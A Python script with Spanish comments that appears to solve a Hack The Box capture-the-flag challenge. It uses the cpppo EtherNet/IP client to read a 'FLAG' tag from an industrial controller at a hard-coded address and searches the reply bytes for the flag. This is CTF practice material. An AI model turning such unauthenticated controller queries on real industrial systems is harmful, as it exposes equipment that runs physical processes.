from cpppo.server.enip import client

host = "154.57.164.68"
port = 32438
tags = ["FLAG"]

print(f"[*] Conectando a {host}:{port}...")

try:
    with client.connector(host=host, port=port) as conn:
        operaciones = client.parse_operations(tags)
        print("[*] Paquete construido. Enviando por la red...")
        
        # Metemos toda la respuesta en una sola variable, sin importar su tamaño
        for resultado in conn.pipeline(operaciones):
            print("\n[+] Respuesta CIP recibida. Analizando bytes...")
            
            # Recorremos cada elemento de la respuesta
            for pedazo in resultado:
                # El valor de los tags suele venir en forma de lista de números enteros
                if isinstance(pedazo, list) or isinstance(pedazo, tuple):
                    try:
                        # Convertimos los números a caracteres ASCII imprimibles
                        texto = "".join([chr(b) for b in pedazo if isinstance(b, int) and 32 <= b <= 126])
                        
                        if "HTB{" in texto:
                            print(f"\n[!!!] BINGO - FLAG ENCONTRADA: {texto}")
                        elif len(texto) > 3:
                            print(f"[*] Texto parcial detectado: {texto}")
                    except:
                        pass
            
            # Por si acaso, imprimimos la tupla completa en bruto
            print(f"\n[*] Paquete crudo: {resultado}")

except Exception as e:
    print(f"[X] Error: {e}")
